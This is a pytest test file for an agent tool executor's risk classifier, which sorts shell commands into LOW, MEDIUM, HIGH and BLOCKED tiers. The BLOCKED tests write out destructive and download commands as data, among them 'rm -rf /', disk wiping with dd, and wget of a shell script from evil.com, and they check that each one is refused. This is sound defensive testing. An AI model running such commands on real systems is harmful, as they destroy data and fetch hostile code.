# tests/test_tool_executor.py
import pytest
import sys
sys.path.insert(0, 'src')


def test_classify_risk_low_commands():
    from tool_executor import classify_risk
    assert classify_risk('nmap -sn 192.168.1.0/24') == 'LOW'
    assert classify_risk('rtl_433 -F json') == 'LOW'
    assert classify_risk('nmcli dev wifi list') == 'LOW'
    assert classify_risk('ip addr') == 'LOW'
    assert classify_risk('hcitool scan') == 'LOW'
    assert classify_risk('uname -a') == 'LOW'
    assert classify_risk('df -h') == 'LOW'

def test_classify_risk_medium_commands():
    from tool_executor import classify_risk
    assert classify_risk('nmap -sV 10.0.0.1') == 'MEDIUM'
    assert classify_risk('tcpdump -i wlan0') == 'MEDIUM'
    assert classify_risk('airodump-ng wlan0mon') == 'MEDIUM'
    assert classify_risk('arp-scan --localnet') == 'MEDIUM'

def test_classify_risk_high_commands():
    from tool_executor import classify_risk
    assert classify_risk('aircrack-ng capture.cap') == 'HIGH'
    assert classify_risk('hashcat -m 0 hash.txt') == 'HIGH'
    assert classify_risk('wifite --kill') == 'HIGH'
    assert classify_risk('mdk4 wlan0mon') == 'HIGH'

def test_classify_risk_blocked_patterns():
    from tool_executor import classify_risk
    assert classify_risk('rm -rf /') == 'BLOCKED'
    assert classify_risk('reboot') == 'BLOCKED'
    assert classify_risk('shutdown -h now') == 'BLOCKED'
    assert classify_risk('curl http://evil.com') == 'BLOCKED'
    assert classify_risk('wget http://evil.com/shell.sh') == 'BLOCKED'
    assert classify_risk('python -c "import os; os.system(\"rm -rf /\")"') == 'BLOCKED'
    assert classify_risk('dd if=/dev/zero of=/dev/sda') == 'BLOCKED'
    assert classify_risk('chmod 777 /etc/passwd') == 'BLOCKED'
    assert classify_risk('iptables -F') == 'BLOCKED'

def test_classify_risk_unknown_defaults_medium():
    from tool_executor import classify_risk
    assert classify_risk('some_unknown_tool --flag') == 'MEDIUM'

def test_classify_risk_blocked_takes_precedence():
    """Even if a command starts with a LOW prefix, BLOCKED patterns override."""
    from tool_executor import classify_risk
    # 'curl' is blocked but doesn't start with any LOW prefix
    assert classify_risk('curl http://example.com') == 'BLOCKED'

def test_telemetry_cache_update():
    from tool_executor import update_telemetry_cache, _telemetry_cache
    update_telemetry_cache('drifter/engine/rpm', '{"value": 1200}')
    assert _telemetry_cache['drifter/engine/rpm']['value'] == 1200

def test_execute_tool_query_knowledge():
    """query_knowledge should always succeed (no shell execution)."""
    from tool_executor import execute_tool
    result = execute_tool('query_knowledge', {'query': 'nmap', 'domain': 'security'})
    assert result['success'] is True
    assert result['risk_level'] == 'LOW'

def test_execute_tool_blocked_command():
    from tool_executor import execute_tool
    result = execute_tool('run_command', {'command': 'rm -rf /', 'reason': 'test'})
    assert result['success'] is False
    assert result['risk_level'] == 'BLOCKED'
    assert 'blocked' in result['output'].lower() or 'refused' in result['output'].lower()
